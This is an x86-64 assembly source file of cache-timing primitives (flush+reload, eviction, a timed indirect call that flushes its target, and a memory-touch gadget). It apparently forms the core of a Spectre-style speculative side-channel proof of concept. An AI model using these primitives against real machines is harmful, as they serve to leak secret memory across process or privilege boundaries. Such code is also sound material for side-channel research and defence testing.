global memory_access:function
global flush_reload:function
global evict:function
global IndirectCall:function
global Touch:function

section .text

memory_access:
  mov r9, rdi

  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax

  mov rax, [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  ret

flush_reload:
  mov r9, rdi

  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax

  mov rax, [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  clflush [r9]
  ret

evict:
  mov al, byte [rdi]
  add rdi, rdx
  dec rsi
  jnz evict
  ret

IndirectCall:
  mov r9, rdi
  mov rdi, rsi
  mov rsi, rdx
  clflush [r9]
  
  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax
  
  movzx eax, byte [rdi]
  shl rax, 0Ch  
  call [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  ret


Touch:
  mov al, byte [rax+rsi]
  ret
